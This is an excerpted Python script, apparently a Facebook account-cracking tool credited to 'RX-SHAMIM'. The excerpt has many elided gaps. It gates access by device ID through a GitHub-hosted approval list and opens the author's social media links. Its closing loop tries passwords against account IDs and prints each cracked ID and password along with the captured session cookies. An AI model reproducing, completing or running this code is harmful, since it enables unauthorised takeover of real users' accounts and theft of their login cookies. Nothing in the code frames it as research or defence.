...
time.sleep(2)
os.system(f'xdg-open https://m.me/j/AbaGMjdsP-rDMsJm/')
...
princp=[]
try:
    prox= requests.get('https://github.com/RSHTBOY/Amproval/blob/main/Amproval.txt').text
...
def uaku():
    try:
        ...
        a=requests.get('https://github.com/RSHTBOY/Amproval/blob/main/Amproval.txt').text
        ua=open('bbnew.txt','w')
...
while attemps < 12345677901:
   ...
   # os.system("espeak -a 300 \Enter,Password, \"")
    if username == 'M1' and password == 'NX':
...
def animation(u):
    for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
os.system('xdg-open https://www.facebook.com/0Twin?mibextid=ZbWKwL')
logo = (f"""
\033[1;92m⊰᯽⊱┈──╌──────╌──╌╌──╌───╌❊╌──╌──╌────╌────╌─╌──┈⊰᯽⊱
...
\033[1;91m[\033[1;92m√\033[1;91m]\033[1;92m \x1b[38;5;46m      ╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝░░░╚═╝░░░      \033[1;91m|
\033[1;92m⊰᯽⊱┈──╌──────╌──╌╌──╌───╌❊╌──╌──╌────╌────╌─╌──┈⊰᯽⊱
\033[1;91m[\033[1;92m√\033[1;91m]\033[1;92m CREATED BY \033[1;91m  :  \033[1;92mRX\033[1;91m-\033[1;92mSHAMIM                    \033[1;91m|
...
\033[1;91m[\033[1;92m√\033[1;91m]\033[1;92m GITHUB\033[1;91m       :  \033[1;92mRX\033[1;91m-\033[1;92mSHAMIM                    \033[1;91m|
...
\033[1;91m[\033[1;92m√\033[1;91m]\033[1;92m TOOL VIRSION\033[1;91m :  \033[1;35m[\033[1;32m\033[1;92m2.0\033[1;35m]                        \033[1;91m|
\033[1;92m⊰᯽⊱┈──╌──────╌──╌╌──╌───╌❊╌──╌──╌────╌────╌─╌──┈⊰᯽⊱
...
def meyexudi():
  ...
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/RSHTBOY/Amproval/blob/main/Amproval.txt').text
    if id in httpCaht:
      print(fuckyoursali)
...
def menu():
    ...
    if SHAMIMin ['111']:
        ...
        os.system('xdg-open https://wa.me/+8801876582573')
        os.system("python nono.py")
    elif SHAMIMin ['3','03']:
        result()
    elif SHAMIMin ['0']:
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[1;91m[RIDOY-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
